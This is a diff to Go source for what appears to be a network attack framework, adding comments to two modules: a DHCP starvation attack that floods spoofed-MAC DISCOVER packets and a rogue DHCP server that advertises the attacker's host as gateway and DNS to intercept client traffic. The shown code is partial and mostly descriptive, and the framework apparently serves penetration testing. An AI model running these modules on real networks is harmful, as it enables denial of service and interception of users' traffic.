@@ -9,6 +9,7 @@ import (
 	"github.com/qyvora/toha3ee/internal/safety"
 )
 
+// init registers the DHCP starvation and rogue-server modules.
 func init() {
 	attacks.Register(&DHCPStarve{})
 	attacks.Register(&DHCPRogue{})
@@ -19,13 +20,15 @@ func init() {
 // It is the standard prelude to dhcp.rogue.
 type DHCPStarve struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*DHCPStarve) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "dhcp.starve",
-		Category:    "mitm",
-		Risk:        attacks.RiskHigh,
-		Targets:     []string{"subnet"},
+		ID:       "dhcp.starve",
+		Category: "mitm",
+		Risk:     attacks.RiskHigh, // active denial-of-service on address assignment
+		Targets:  []string{"subnet"},
+		// Sending spoofed-MAC DISCOVERs needs a raw socket so the chaddr field
+		// can be forged on every packet.
 		Requires:    []string{"cap.raw_socket"},
 		Description: "DHCP starvation: exhaust the DHCP lease pool with spoofed-MAC DISCOVERs to deny address assignment",
 		Limitations: "large pools take a while to exhaust; DHCP snooping on the switch drops spoofed-chaddr packets",
@@ -67,6 +70,9 @@ func (*DHCPStarve) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	ctx.Heartbeat = hb.Beat
 	ctx.Safety.RegisterHeartbeat("dhcp.starve", hb)
 
+	// Each iteration of the outer loop fires a short burst of DISCOVERs with
+	// freshly randomized client MACs, then paces itself so the socket and the
+	// network are not overwhelmed in a single hammer.
 	burst := 40
 	ctx.Printf("[*] dhcp.starve flooding DISCOVERs with spoofed MACs on %s...\n", ctx.Iface.Name)
 	for {
@@ -77,6 +83,8 @@ func (*DHCPStarve) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 		}
 		for i := 0; i < burst; i++ {
 			if err := st.SendDiscover(); err != nil {
+				// A send failure usually means the kernel's ARP cache for the
+				// DHCP server is missing; back off a moment before retrying.
 				ctx.Printf("[!] dhcp.starve: %v\n", err)
 				time.Sleep(time.Second)
 				break
@@ -116,13 +124,15 @@ func (*DHCPStarve) Cleanup(ctx *attacks.AttackCtx) error {
 // and DNS resolver, so client traffic is redirected through the attacker.
 type DHCPRogue struct{}
 
-// Meta implements attacks.Module.
+// Meta implements attacks.Module, returning the module's registry descriptor.
 func (*DHCPRogue) Meta() attacks.ModuleMeta {
 	return attacks.ModuleMeta{
-		ID:          "dhcp.rogue",
-		Category:    "mitm",
-		Risk:        attacks.RiskHigh,
-		Targets:     []string{"subnet"},
+		ID:       "dhcp.rogue",
+		Category: "mitm",
+		Risk:     attacks.RiskHigh,
+		Targets:  []string{"subnet"},
+		// Binding the DHCP server port 67 and crafting OFFERs on the wire needs
+		// root and raw socket access.
 		Requires:    []string{"cap.raw_socket"},
 		Description: "rogue DHCP server: offer this host as gateway+DNS to every DHCP client to capture their traffic",
 		Limitations: "the real DHCP server may win the race on answering clients; DHCP snooping blocks non-trusted-server offers",
@@ -153,6 +163,8 @@ func (*DHCPRogue) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
 	if ctx.Iface == nil {
 		return fmt.Errorf("dhcp.rogue: no interface configured")
 	}
+	// The responder is configured with this host's address so every OFFER
+	// advertises us as gateway + DNS server to the requesting client.
 	r := dhcp.NewResponder(dhcp.Config{ServerIP: ctx.Iface.IP})
 	if err := r.Start(); err != nil {
 		return fmt.Errorf("dhcp.rogue: %w", err)
@@ -185,6 +197,8 @@ func (*DHCPRogue) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
 	}
 	r := v.(*dhcp.Responder)
 	imp := &attacks.Impact{
+		// Offers is the count of DISCOVERs we answered; Queries is the raw
+		// DHCP packet total observed on the socket.
 		Summary: fmt.Sprintf("answered %d DISCOVERs with rogue OFFERs", r.Offers.Load()),
 	}
 	imp.Add("offers", fmt.Sprintf("%d", r.Offers.Load()))
@@ -202,5 +216,6 @@ func (*DHCPRogue) Cleanup(ctx *attacks.AttackCtx) error {
 	return nil
 }
 
+// Compile-time assertions that both DHCP modules implement attacks.Module.
 var _ attacks.Module = (*DHCPStarve)(nil)
 var _ attacks.Module = (*DHCPRogue)(nil)
